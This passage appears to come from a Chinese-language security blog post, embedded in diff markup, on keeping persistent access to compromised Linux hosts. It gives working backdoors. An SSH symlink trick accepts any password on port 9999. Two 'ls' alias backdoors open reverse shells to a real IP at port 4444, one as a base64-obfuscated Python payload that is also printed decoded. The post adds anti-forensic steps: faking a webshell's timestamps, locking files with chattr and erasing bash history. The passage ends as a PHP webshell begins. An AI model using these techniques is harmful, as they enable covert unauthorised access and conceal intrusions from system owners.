+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/33.png"
+	width="1902"
+	height="644"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/33_hu_785bc1c3809ec77b.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/33_hu_7f7a05ea91cfc9a3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="295"
+		data-flex-basis="708px"
+	
+></p>
+<h2 id="28ssh-软连接">2.8.SSH 软连接
+</h2><p><strong>SSH软链接：</strong><font style="color:#DF2A3F;">在sshd服务配置启用PAM认证的前提下</font><strong>，PAM配置文件中控制标志为sufficient时，只</strong></p>
+<p><strong>要pam rootok模块检测uid为0(root)即可成功认证登录。</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="n">查看是否支持pam身份验证</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">sshd_config</span><span class="o">|</span><span class="n">grep</span><span class="w"> </span><span class="n">UsePAM</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/34.png"
+	width="1598"
+	height="200"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/34_hu_c110cd752a1af9c0.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/34_hu_1f2900eef2f7d0fe.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="799"
+		data-flex-basis="1917px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="n">建立软链接</span><span class="err">，</span><span class="n">并且如果有防火墙的话</span><span class="err">，</span><span class="n">需要设置允许对应端口通行</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ln</span><span class="w"> </span><span class="o">-</span><span class="n">sf</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">sshd</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">su</span><span class="w"> </span><span class="p">;</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">su</span><span class="w"> </span><span class="o">-</span><span class="n">oPort</span><span class="o">=</span><span class="n">9999</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">开启软链接</span><span class="err">，</span><span class="n">链接端口为9999</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">firewall</span><span class="o">-</span><span class="n">cmd</span><span class="w"> </span><span class="o">--</span><span class="n">add</span><span class="o">-</span><span class="n">port</span><span class="o">=</span><span class="n">9999</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="o">--</span><span class="n">permanent</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">开启防火墙规则</span><span class="err">，</span><span class="n">不然会连接不上</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">firewall</span><span class="o">-</span><span class="n">cmd</span><span class="w"> </span><span class="o">--</span><span class="n">reload</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">重启防火墙服务</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">firewall</span><span class="o">-</span><span class="n">cmd</span><span class="w"> </span><span class="o">--</span><span class="n">query</span><span class="o">-</span><span class="n">port</span><span class="o">=</span><span class="n">9999</span><span class="o">/</span><span class="n">tcp</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">查看防火墙9999端口是否被放行</span><span class="err">，</span><span class="n">回显为YES即成功放行</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/35.png"
+	width="1997"
+	height="245"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/35_hu_88a4422aef94f6e0.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/35_hu_3ac382dcb27e9dc4.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="815"
+		data-flex-basis="1956px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">ssh</span><span class="w"> </span><span class="n">root</span><span class="nd">@47.76.47.203</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">9999</span><span class="w">       </span><span class="c1">//密码随便输入都可以直连，缺点就是容易被发现，突然多开了一个端口</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/36.png"
+	width="1389"
+	height="254"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/36_hu_3292093a748b6458.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/36_hu_8fea4b87b9efadb0.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="546"
+		data-flex-basis="1312px"
+	
+></p>
+<h2 id="29alias别名后门">2.9.Alias别名后门
+</h2><p><strong>Alias命令的功能：为命令设置别名</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">alias</span><span class="w"> </span><span class="n">ls</span><span class="o">=</span><span class="s">&#34;ls -al&#34;</span><span class="w">               </span><span class="c1">//将ls命令设置为ls -al</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">unalias</span><span class="w"> </span><span class="n">ls</span><span class="w">                      </span><span class="c1">//删除别名</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/37.png"
+	width="1330"
+	height="898"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/37_hu_5a7f2427b7451224.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/37_hu_b26ce3b34ea929d4.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="148"
+		data-flex-basis="355px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">alias</span><span class="w"> </span><span class="n">ls</span><span class="o">=</span><span class="err">&#39;</span><span class="n">alerts</span><span class="p">(){</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="n">$</span><span class="o">*</span><span class="w"> </span><span class="o">--</span><span class="n">color</span><span class="o">=</span><span class="n">auto</span><span class="p">;</span><span class="n">bash</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="o">&gt;&amp;</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">114</span><span class="p">.</span><span class="na">116</span><span class="p">.</span><span class="na">233</span><span class="p">.</span><span class="na">221</span><span class="o">/</span><span class="n">4444</span><span class="w"> </span><span class="n">0</span><span class="o">&gt;&amp;</span><span class="n">1</span><span class="p">;</span><span class="w"> </span><span class="p">};</span><span class="n">alerts</span><span class="err">&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">执行完ls之后</span><span class="err">，</span><span class="n">执行反弹shell的命令</span><span class="p">,</span><span class="n">这样执行完成后</span><span class="err">，</span><span class="n">会话会一直卡住</span><span class="err">，</span><span class="n">会引起怀疑</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/38.png"
+	width="1913"
+	height="299"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/38_hu_fdc9945bbf5b5d6e.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/38_hu_888ee8a72ab2903d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="639"
+		data-flex-basis="1535px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">执行不会卡住的同时</span><span class="err">，</span><span class="n">也会反弹shell</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">alias</span><span class="w"> </span><span class="n">ls</span><span class="o">=</span><span class="err">&#39;</span><span class="n">alerts</span><span class="p">(){</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="n">$</span><span class="o">*</span><span class="w"> </span><span class="o">--</span><span class="n">color</span><span class="o">=</span><span class="n">auto</span><span class="p">;</span><span class="n">python3</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s">&#34;import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,&#39;\&#39;&#39;UTF-8&#39;\&#39;&#39;)}[sys.version_info[0]](&#39;\&#39;&#39;aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzOwpyZXQgPSBvcy5mb3JrKCkKaWYgcmV0ID4gMDoKICAgIGV4aXQoKQplbHNlOgogICAgdHJ5OgogICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgcy5jb25uZWN0KCgiMTE0LjExNi4yMzMuMjIxIiwgNDQ0NCkpCiAgICAgICAgb3MuZHVwMihzLmZpbGVubygpLCAwKQogICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSwgMSkKICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCksIDIpCiAgICAgICAgcCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCAiLWkiXSkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBleGl0KCk=&#39;\&#39;&#39;)))&#34;</span><span class="p">;};</span><span class="n">alerts</span><span class="err">&#39;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">os</span><span class="p">,</span><span class="n">socket</span><span class="p">,</span><span class="n">subprocess</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">os</span><span class="p">.</span><span class="na">fork</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">if</span><span class="w"> </span><span class="n">ret</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">exit</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">else</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="p">.</span><span class="na">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="na">AF_INET</span><span class="p">,</span><span class="w"> </span><span class="n">socket</span><span class="p">.</span><span class="na">SOCK_STREAM</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">s</span><span class="p">.</span><span class="na">connect</span><span class="p">((</span><span class="s">&#34;114.116.233.221&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">4444</span><span class="p">))</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">os</span><span class="p">.</span><span class="na">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="na">fileno</span><span class="p">(),</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">os</span><span class="p">.</span><span class="na">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="na">fileno</span><span class="p">(),</span><span class="w"> </span><span class="n">1</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">os</span><span class="p">.</span><span class="na">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="na">fileno</span><span class="p">(),</span><span class="w"> </span><span class="n">2</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">subprocess</span><span class="p">.</span><span class="na">call</span><span class="p">(</span><span class="o">[</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;-i&#34;</span><span class="o">]</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">except</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">e</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">exit</span><span class="p">()</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/39.png"
+	width="2255"
+	height="526"
+	srcset="/p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/39_hu_5139aeb0ef2e76a7.png 480w, /p/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E6%9C%AF/image/39_hu_7eaabd7d9f64354a.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="428"
+		data-flex-basis="1028px"
+	
+></p>
+<h2 id="210">2.10.<strong><font style="color:rgb(13, 0, 22);">内核加载 LKM-Rootkit 后门</font></strong>
+</h2><p><strong><font style="color:rgb(13, 0, 22);">先前面这几种情况，就算做了隐藏，查看端口一条命令也能发现与别的ip建立了连接，而使用Rootkit，可以把进程，端口，甚至文件全部都隐藏了，比较难以发现。</font></strong></p>
+<p><a class="link" href="https://blog.csdn.net/weixin_71529930/article/details/142063940"  target="_blank" rel="noopener"
+    >第145天：内网安全-Linux权限维持&amp;Rootkit后门&amp;Strace监控&amp;Alias别名&amp;Cron定时任务_rootkit权限维持-CSDN博客</a></p>
+<h2 id="211linux权限维持常用的一些技术手段">2.11.Linux权限维持常用的一些技术手段
+</h2><h3 id="1修改文件或终端属性touch">1.修改文件或终端属性touch
+</h3><p><strong>touch命令⽤于修改⽂件或者⽬录的时间属性，包括存取时间和更改时间。若⽂件不存在，系统会建⽴⼀个新的⽂件，可以将自己的后门文件或落地文件的属性设置的和目标原始文件一致</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">touch</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="n">index</span><span class="p">.</span><span class="na">php</span><span class="w"> </span><span class="n">shell</span><span class="p">.</span><span class="na">php</span><span class="w"> </span><span class="n">将shell</span><span class="p">.</span><span class="na">php文件设置成和index</span><span class="p">.</span><span class="na">php一致</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="2文件或文件夹加锁chattr">2.文件或文件夹加锁chattr
+</h3><p><strong>锁定文件/文件夹不让其它用户删除</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">chattr</span><span class="w"> </span><span class="o">+</span><span class="n">i</span><span class="w"> </span><span class="n">evil</span><span class="p">.</span><span class="na">php</span><span class="w"> </span><span class="err">#</span><span class="n">锁定</span><span class="err">⽂</span><span class="n">件</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">rm</span><span class="w"> </span><span class="o">-</span><span class="n">rf</span><span class="w"> </span><span class="n">evil</span><span class="p">.</span><span class="na">php</span><span class="w"> </span><span class="err">#</span><span class="n">提示禁</span><span class="err">⽌</span><span class="n">删除</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">lsattr</span><span class="w"> </span><span class="n">evil</span><span class="p">.</span><span class="na">php</span><span class="w"> </span><span class="err">#</span><span class="n">属性查看</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">chattr</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">evil</span><span class="p">.</span><span class="na">php</span><span class="w"> </span><span class="err">#</span><span class="n">解除锁定</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">rm</span><span class="w"> </span><span class="o">-</span><span class="n">rf</span><span class="w"> </span><span class="n">evil</span><span class="p">.</span><span class="na">php</span><span class="w"> </span><span class="err">#</span><span class="n">彻底删除</span><span class="err">⽂</span><span class="n">件</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="3history">3.History
+</h3><p><strong>你在Linux执行的任何命令都会被记录到/root/.bash_history中，所以你在做完权限维持后记住清除你执行过的命令</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="n">1</span><span class="p">.</span><span class="na">只针对你的</span><span class="err">⼯</span><span class="n">作关闭历史记录</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">[</span><span class="n">space</span><span class="o">]</span><span class="n">set</span><span class="w"> </span><span class="o">+</span><span class="n">o</span><span class="w"> </span><span class="n">history</span><span class="w"> </span><span class="err">#</span><span class="n">备注</span><span class="err">：</span><span class="o">[</span><span class="n">space</span><span class="o">]</span><span class="w"> </span><span class="n">表示空格</span><span class="err">。</span><span class="n">并且由于空格的缘故</span><span class="err">，</span><span class="n">该命令本身也不会被记录</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">[</span><span class="n">Space</span><span class="o">]</span><span class="n">set</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">history</span><span class="w"> </span><span class="err">#</span><span class="n">将环境恢复原状</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="n">删除</span><span class="err">⼤</span><span class="n">规模历史操作记录</span><span class="err">，</span><span class="n">这</span><span class="err">⾥，</span><span class="n">我们只保留前150</span><span class="err">⾏</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sed</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="err">&#39;</span><span class="n">150</span><span class="p">,</span><span class="n">$d</span><span class="err">&#39;</span><span class="w"> </span><span class="p">.</span><span class="na">bash_history</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="212linux权限维持小结">2.12.Linux权限维持小结
+</h2><p><strong>1.Linux常见维持方法有哪些？</strong></p>
+<p><strong>1.添加账号 2.写SSH公私钥 3.定时任务反弹Shell 4.Strace键盘记录后门 5.OpenSSH后门 6.SSH PAM后门 7.SSH 软连接后门 8.Alias别名反弹shell 9.Rookit后门</strong></p>
+<p><strong>2.Linux权限维持中每种后门的不同点</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">1</span><span class="p">.</span><span class="na">添加账号</span><span class="w">         </span><span class="err">#</span><span class="n">最简单也做让人容易发现</span><span class="w">   </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">2</span><span class="p">.</span><span class="na">SSH公私钥</span><span class="w">        </span><span class="err">#</span><span class="n">比较简单也容易让别人发现</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">3</span><span class="p">.</span><span class="na">SSH定时任务</span><span class="w">      </span><span class="err">#</span><span class="n">最简单也做让人容易发现</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">4</span><span class="p">.</span><span class="na">Strace键盘记录后门</span><span class="w">     </span><span class="err">#</span><span class="n">需要配合水坑攻击</span><span class="err">，</span><span class="n">让管理员进行登录才能获取到管理员账户密码</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">5</span><span class="p">.</span><span class="na">OpenSSH后门</span><span class="w">      </span><span class="err">#</span><span class="n">非常复杂</span><span class="err">，</span><span class="n">还要替换目标主机文件</span><span class="err">，</span><span class="n">隐蔽性较好</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">6</span><span class="p">.</span><span class="na">SSH</span><span class="w"> </span><span class="n">PAM后门</span><span class="w">      </span><span class="err">#</span><span class="n">较复杂但是需要目标主机存在pam环境</span><span class="w"> </span><span class="n">rpm</span><span class="w"> </span><span class="o">-</span><span class="n">qa</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="n">pam</span><span class="w">         </span><span class="c1">//查询pam版本</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">7</span><span class="p">.</span><span class="na">SSH软连接后门</span><span class="w">    </span><span class="err">#</span><span class="n">简单但需要目标主机支持pam身份验证</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">8</span><span class="p">.</span><span class="na">Alias别名后门</span><span class="w">    </span><span class="err">#</span><span class="n">简单</span><span class="err">，</span><span class="n">但也容易被发现</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">9</span><span class="p">.</span><span class="na">Rookit内核加载后门</span><span class="w">    </span><span class="err">#</span><span class="n">隐蔽性极强</span><span class="err">，</span><span class="n">但是一般不让使用</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="3web权限维持">3.Web权限维持
+</h1><p><a class="link" href="https://blog.csdn.net/weixin_71529930/article/details/142097034"  target="_blank" rel="noopener"
+    >第146天：内网安全-Web权限维持&amp;各语言内存马&amp;Servlet-api类&amp;Spring类&amp;Agent类_内存马如何连接-CSDN博客</a></p>
+<p><strong><font style="color:rgb(77, 77, 77);">内存马是无文件攻击的一种常用手段，随着攻防演练热度越来越高</font></strong><a class="link" href="https://so.csdn.net/so/search?q=%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90&amp;spm=1001.2101.3001.7020"  target="_blank" rel="noopener"
+    ><strong><font style="color:rgb(252, 85, 49);">流量分析</font></strong></a><strong><font style="color:rgb(77, 77, 77);">、EDR等专业安全设备被蓝方广泛使用，传统的文件上传的webshll或以文件形式驻留的后门越来越容易被检测到，内存马使用越来越多，内存马是无文件马，利用中间件的进程执行某些恶意代码，不会有文件落地，给检测带来巨大难度。内存马可以通过访问存在漏洞的url加上命令执行参数，即可让服务器返回结果也可通过webshell管理工具例如：蚁剑、冰蝎、哥斯拉等进行远程连接后攻击目标。</font></strong></p>
+<h2 id="31php-webshell">3.1.Php WebShell
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="n">php</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nf">ignore_user_abort</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
